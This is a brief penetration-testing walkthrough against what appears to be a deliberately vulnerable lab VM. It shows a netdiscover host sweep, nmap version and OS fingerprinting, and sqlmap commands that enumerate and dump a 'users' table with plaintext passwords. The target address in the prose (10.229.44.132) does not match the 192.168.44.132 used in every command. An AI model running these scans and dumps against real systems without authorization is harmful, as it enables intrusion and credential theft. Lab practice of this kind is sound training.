# pentest process

## Discover target

```bash
sudo netdiscover

 Currently scanning: 192.168.97.0/16   |   Screen View: Unique Hosts

 25 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 1500
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.44.2    00:50:56:fc:6c:b0      2     120  VMware, Inc.
 192.168.44.1    00:50:56:c0:00:08     19    1140  VMware, Inc.
 192.168.44.130  00:0c:29:f4:6d:14      1      60  VMware, Inc.
 192.168.44.132  00:0c:29:d9:cf:c7      1      60  VMware, Inc.
 192.168.44.254  00:50:56:e7:2c:fd      2     120  VMware, Inc.
```

Our target uses `10.229.44.132`

## Fingerprinting

```bash
sudo nmap -sV -O 192.168.44.132

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 13:06 BST
Nmap scan report for 192.168.44.132
Host is up (0.00069s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.16 ((Debian))
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
MAC Address: 00:0C:29:D9:CF:C7 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
```

- port 22 openssh 5.5p1
- port 80 apache 2.2.16
- port 389 openldap 2.2.x - 2.3.x
- OS linux kernel 2.6.32 Debian 6+

## SQL mapping

```
sqlmap --url 'http://192.168.44.132/sqli/example1.php?name=root' --dbs

available databases [2]:
[*] exercises
[*] information_schema

sqlmap --url 'http://192.168.44.132/sqli/example1.php?name=root' --tables -D exercises

Database: exercises
[1 table]
+-------+
| users |
+-------+

sqlmap --url 'http://192.168.44.132/sqli/example1.php?name=root' --columns -D exercises

Database: exercises
Table: users
[5 columns]
+---------+-------------+
| Column  | Type        |
+---------+-------------+
| age     | int(11)     |
| groupid | int(11)     |
| id      | int(11)     |
| name    | varchar(50) |
| passwd  | varchar(50) |
+---------+-------------+

sqlmap --url 'http://192.168.44.132/sqli/example1.php?name=root' --dump -D exercises

Database: exercises
Table: users
[4 entries]
+----+---------+-----+-------+---------+
| id | groupid | age | name  | passwd  |
+----+---------+-----+-------+---------+
| 1  | 10      | 10  | admin | admin   |
| 2  | 0       | 30  | root  | admin21 |
| 3  | 2       | 5   | user1 | secret  |
| 5  | 5       | 2   | user2 | azerty  |
+----+---------+-----+-------+---------+

```